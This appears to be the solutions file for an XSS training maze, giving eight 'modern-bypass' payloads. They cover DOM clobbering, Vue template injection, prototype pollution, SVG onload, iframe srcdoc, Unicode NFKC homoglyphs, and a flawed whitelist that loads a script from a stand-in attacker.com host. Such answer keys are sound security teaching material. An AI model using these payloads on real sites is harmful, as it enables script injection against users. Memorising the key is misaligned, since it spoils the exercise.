# modern-bypass — solutions

Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js CSTI tag bypass, client prototype pollution, SVG direct load, iframe srcdoc, Unicode NFKC, and flawed regex whitelists.

### modern-bypass-level1

`[POST] /modern-bypass/level1/save`
- body: `content=<script>alert(1)</script>`

`[GET] /modern-bypass/level1/preview?view=draft`
- payload: `<script>alert(1)</script>`
- context: Session-locked multi-step draft editor; save payload via POST first, then retrieve via GET with active cookie.

### modern-bypass-level2

`/modern-bypass/level2/?query=%3Ca%20id=config%20href=%22data:text/javascript,alert(1)%22%3E`

- payload: `<a id="config" href="data:text/javascript,alert(1)">`
- context: Standard tags/events stripped, but allowed anchor tag with custom id clobbers global `window.config` reference to load dynamic script.

### modern-bypass-level3

`/modern-bypass/level3/?query=%7B%7Bconstructor.constructor(%27alert(1)%27)()%7D%7D`

- payload: `{{constructor.constructor('alert(1)')()}}`
- context: Angle brackets `<` and `>` stripped completely, but evaluates directly inside Vue.js app container.

### modern-bypass-level4

`/modern-bypass/level4/#%7B%22__proto__%22:%7B%22scriptUrl%22:%22data:text/javascript,alert(1)%22%7D%7D`

- payload: `#{"__proto__":{"scriptUrl":"data:text/javascript,alert(1)"}}`
- context: Client-side recursive object merge does not block proto key, allowing global prototype pollution which is then read by dynamic script load.

### modern-bypass-level5

`/modern-bypass/level5/?svg=%3Csvg%20onload=alert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: Recursive case-insensitive `<script>` tag strip bypassed using raw element-level events on SVG under `image/svg+xml` content-type.

### modern-bypass-level6

`/modern-bypass/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: Input is HTML-escaped, but browser decodes entities within iframe `srcdoc` attribute before parsing it.

### modern-bypass-level7

`/modern-bypass/level7/?query=%EF%BC%9C%EF%BD%93%EF%BD%83%EF%BD%92%EF%BD%89%EF%BD%90%EF%BD%94%EF%BC%9E`

- payload: `＜ｓｃｒｉｐｔ＞`
- context: Strict keyword/event WAF bypassed using Unicode homoglyphs, which then normalize to standard tags via client-side `.normalize('NFKC')`.

### modern-bypass-level8

`/modern-bypass/level8/?callback_url=https://xssmaze.com.attacker.com/malicious.js`

- payload: `https://xssmaze.com.attacker.com/malicious.js`
- context: Flawed domain regex whitelist prefix check lacks proper anchors/slashes, allowing attacker subdomains starting with whitelist domain.
